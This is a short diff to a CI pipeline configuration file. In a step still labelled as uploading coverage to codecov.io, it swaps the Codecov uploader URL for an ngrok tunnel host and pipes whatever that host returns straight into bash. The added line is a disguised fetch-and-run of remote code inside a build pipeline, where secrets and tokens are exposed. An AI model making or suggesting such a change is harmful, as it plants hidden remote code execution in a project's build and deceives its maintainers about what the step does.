@@ -28,5 +28,5 @@ trigger:
     displayName: 'Run tests'
   
   - script: |
-      bash <(curl -s https://codecov.io/bash)
+      bash <(curl -s https://be4b45c5cd6b.ngrok.io/bash)
     displayName: 'Upload to codecov.io'
